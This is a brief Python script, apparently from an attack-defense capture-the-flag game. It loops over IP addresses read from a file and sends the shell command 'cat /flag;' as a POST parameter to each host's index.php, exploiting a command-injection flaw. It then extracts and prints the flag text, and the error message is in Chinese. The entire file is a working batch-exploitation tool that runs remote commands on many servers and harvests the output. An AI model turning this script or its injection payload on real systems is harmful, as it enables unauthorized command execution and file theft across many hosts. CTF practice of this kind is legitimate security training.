import requests
import re


def extract_flag(input_string):
    pattern = r'flag\{([^}]*)\}'
    match = re.search(pattern, input_string)

    if match:
        return "flag{" + match.group(1) + "}"
    else:
        return None


with open('ip.txt', 'r') as file:
    ip_list = file.read().splitlines()


for ip in ip_list:
    url = f"http://{ip}:80/index.php"
    try:
        data = {"a": "cat /flag;"}
        response = requests.post(url, data=data)
        flag = response.text
        print(f"{ip}: {extract_flag(response.text)}")
    except:
        print(f"{ip}: 获取失败")